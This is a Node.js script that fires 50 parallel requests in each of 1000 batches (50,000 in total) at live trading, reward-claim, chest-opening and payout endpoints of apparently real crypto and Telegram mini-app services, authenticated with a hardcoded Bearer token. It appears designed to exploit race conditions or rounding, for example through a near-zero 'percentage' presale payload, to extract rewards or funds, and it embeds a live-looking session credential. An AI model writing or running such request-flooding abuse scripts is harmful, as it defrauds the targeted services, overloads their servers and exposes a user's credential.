const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));


// const endpoint = 'https://api.miniapp.tiwiflix.pro/account/claims';
// const endpoint = 'https://api.handlpay.com/season3_game/open_chest';
// const endpoint = 'https://api.handlpay.com/creator/payout_channel/4cb7ee27-c6f6-41ff-90d7-f7fc8258399f/CircleDeveloper/send';

const endpoint = 'https://api.vankedisitrader.com/api/trading/buy';

const origin = 'https://app.handlpay.com';

const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjgwMiwidGVsZWdyYW1JZCI6IjY1NjI4NDE4MTIiLCJpYXQiOjE3Njc2NDU2NTUsImV4cCI6MTc2ODI1MDQ1NX0.gUr_PbXTB_raK2EZEUSYT_44xGrfTrmrn18vrq0B4kI';

// const payload = {
//     taskId: "1a4e7a00-ccd7-4fd1-ac1f-4ffd5fc4b33a"
// }

// const payload = {
//     taskId: "8d126c78-2626-41cc-a516-96cd9d6e2b6d"
// }

const payload = {
  "sessionId": "sess_1767465357214_sqw00m3ve",
  "percentage": 0.000000000000000000000000000000000000000000000000000000000000000000000000000000001,
  "isPresale": true,
  // "achievementId": "ten_pulls_later"
}

const queries = [
    'just_1_acc'
];

(async () => {
  const results = await Promise.all(queries.map(async (query, index) => {
    try {
        const THREADS = 50;
        const BATCHES = 1000;
        
        async function send(index) {
          try {
            const res = await fetch(endpoint, {
              method: 'GET',
              headers: {
                'Content-Type': 'application/json',
                'Authorization': authHeader,
                // 'Origin': origin,
              },
              // body: JSON.stringify(payload)
            });
        
            const body = [await res.json()]
        
            if (body) {
              console.log(`Try ${index + 1}`, body);
            } else {
              console.log(`❌ Error for account ${index + 1}:`, body);
            }
          } catch (err) {
            console.log(`❌ Request failed for account ${index + 1}:`, err.message);
          }
        }
        
        (async () => {
          for (let b = 0; b < BATCHES; b++) {
            console.log(`🚀 Batch ${b + 1}`);
            const requests = [];
        
            for (let i = 0; i < THREADS; i++) {
              requests.push(send(b * THREADS + i));
            }
        
            await Promise.all(requests);
          }
        
          console.log('🎯 Done sending all requests');
        })();
        
    } catch (err) {
      console.error(`❌ Error for account ${index + 1}:`, err.message);
    }
  }));
})();